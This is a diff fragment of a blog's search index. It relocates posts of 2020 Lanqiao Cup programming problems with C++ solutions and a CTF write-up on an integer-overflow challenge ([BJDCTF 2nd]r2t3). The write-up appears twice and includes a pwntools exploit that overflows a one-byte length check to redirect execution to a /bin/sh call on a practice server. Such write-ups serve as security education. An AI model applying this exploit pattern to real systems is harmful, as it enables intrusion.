+<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<h2 id="试题D-跑步锻炼"><a href="#试题D-跑步锻炼" class="headerlink" title="试题D 跑步锻炼"></a>试题D 跑步锻炼</h2><p>【问题描述】<br>小蓝每天都锻炼身体。<br>正常情况下，小蓝每天跑 1 千米。如果某天是周一或者月初（1 日），为了<br>激励自己，小蓝要跑 2 千米。如果同时是周一或月初，小蓝也是跑 2 千米。<br>小蓝跑步已经坚持了很长时间，从 2000 年 1 月 1 日周六（含）到 2020 年<br>10 月 1 日周四（含）。请问这段时间小蓝总共跑步多少千米？</p>
+<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<h2 id="试题E-七段码"><a href="#试题E-七段码" class="headerlink" title="试题E 七段码"></a>试题E 七段码</h2><p>【问题描述】<br>小蓝要用七段码数码管来表示一种特殊的文字。</p>
+<p>七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。<br>例如：b 发光，其他二极管不发光可以用来表达一种字符。<br>例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。<br>例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。<br>例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。<br>请问，小蓝可以用七段码数码管表达多少种不同的字符？</p>
+<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+]]></content>
+      <categories>
+        <category>program</category>
+      </categories>
+  </entry>
+  <entry>
     <title>orw</title>
     <url>/2021/03/24/orw/</url>
     <content><![CDATA[<h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><span id="more"></span>
@@ -1019,39 +1052,6 @@
       </tags>
   </entry>
   <entry>
-    <title>program</title>
-    <url>/2021/04/12/program/</url>
-    <content><![CDATA[<p>记录编程相关</p>
-<span id="more"></span>
-
-<h1 id="2020蓝桥杯省赛"><a href="#2020蓝桥杯省赛" class="headerlink" title="2020蓝桥杯省赛"></a>2020蓝桥杯省赛</h1><h2 id="A-门牌制作"><a href="#A-门牌制作" class="headerlink" title="A 门牌制作"></a>A 门牌制作</h2><p>【问题描述】<br>小蓝要为一条街的住户制作门牌号。<br>这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。<br>小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字<br>符粘贴到门牌上，例如门牌 1017 需要依次粘贴字符 1、 0、 1、 7，即需要 1 个<br>字符 0， 2 个字符 1， 1 个字符 7。<br>请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,t,n=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(t=i;t!=<span class="number">0</span>;t/=<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">if</span>(t%<span class="number">10</span>==<span class="number">2</span>)</span><br><span class="line">				n++;</span><br><span class="line">	cout&lt;&lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>624</p>
-</blockquote>
-<h2 id="试题B-既约分数"><a href="#试题B-既约分数" class="headerlink" title="试题B 既约分数"></a>试题B 既约分数</h2><p>【问题描述】<br>如果一个分数的分子和分母的最大公约数是1，这个分数称为既约分数。例如，3/4 , 5/2 , 1/8 , 7/1都是既约分数。请问，有多少个既约分数，分子和分母都是1 到2020 之间的整数（包括1和2020）？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2020</span>;j++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(k=i;;k--)</span><br><span class="line">    			<span class="keyword">if</span>(i%k==<span class="number">0</span> &amp;&amp; j%k==<span class="number">0</span>)</span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    		<span class="keyword">if</span>(k==<span class="number">1</span>)</span><br><span class="line">    			num++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="试题C-蛇形填数"><a href="#试题C-蛇形填数" class="headerlink" title="试题C 蛇形填数"></a>试题C 蛇形填数</h2><p>【问题描述】<br>如下图所示，小明用从1 开始的正整数“蛇形”填充无限大的矩阵。</p>
-<p><img src="/.ink//image-20210412201731138.png" alt="image-20210412201731138"></p>
-<p>容易看出矩阵第二行第二列中的数是5。请你计算矩阵中第20 行第20 列的数是多少？</p>
-<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<h2 id="试题D-跑步锻炼"><a href="#试题D-跑步锻炼" class="headerlink" title="试题D 跑步锻炼"></a>试题D 跑步锻炼</h2><p>【问题描述】<br>小蓝每天都锻炼身体。<br>正常情况下，小蓝每天跑 1 千米。如果某天是周一或者月初（1 日），为了<br>激励自己，小蓝要跑 2 千米。如果同时是周一或月初，小蓝也是跑 2 千米。<br>小蓝跑步已经坚持了很长时间，从 2000 年 1 月 1 日周六（含）到 2020 年<br>10 月 1 日周四（含）。请问这段时间小蓝总共跑步多少千米？</p>
-<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-<h2 id="试题E-七段码"><a href="#试题E-七段码" class="headerlink" title="试题E 七段码"></a>试题E 七段码</h2><p>【问题描述】<br>小蓝要用七段码数码管来表示一种特殊的文字。</p>
-<p>七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。<br>例如：b 发光，其他二极管不发光可以用来表达一种字符。<br>例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。<br>例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。<br>例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。<br>请问，小蓝可以用七段码数码管表达多少种不同的字符？</p>
-<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
-]]></content>
-      <categories>
-        <category>program</category>
-      </categories>
-  </entry>
-  <entry>
     <title>_stack_chk_fail</title>
     <url>/2021/03/24/stack_chk_fail/</url>
     <content><![CDATA[<h1 id="stack-chk-fail"><a href="#stack-chk-fail" class="headerlink" title="stack_chk_fail"></a>stack_chk_fail</h1><span id="more"></span>
@@ -1105,6 +1105,40 @@
       </tags>
   </entry>
   <entry>
+    <title>整形溢出</title>
+    <url>/2021/03/24/Shaping%20overflow/</url>
+    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
+<p>先看ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
+<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
+<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
+<p>程序中给出了/bin/sh的地址</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>Int8, 等于Byte, 占1个字节.</p>
+<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
+<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
+<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
+<p>   　这样, 看起来比short,int,long更加直观些!</p>
+<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
+<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
+<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
+<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>整形溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>systemcall</title>
     <url>/2021/04/16/systemcall/</url>
     <content><![CDATA[<h1 id="systemcall"><a href="#systemcall" class="headerlink" title="systemcall"></a>systemcall</h1><span id="more"></span>
@@ -1147,40 +1181,6 @@
       </categories>
       <tags>
         <tag>SystemCall</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>整形溢出</title>
-    <url>/2021/03/24/Shaping%20overflow/</url>
-    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
-<p>先看ida</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
-<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
-<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
-<p>程序中给出了/bin/sh的地址</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p>Int8, 等于Byte, 占1个字节.</p>
-<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
-<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
-<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
-<p>   　这样, 看起来比short,int,long更加直观些!</p>
-<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
-<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
-<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
-<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>整形溢出</tag>
       </tags>
   </entry>
   <entry>
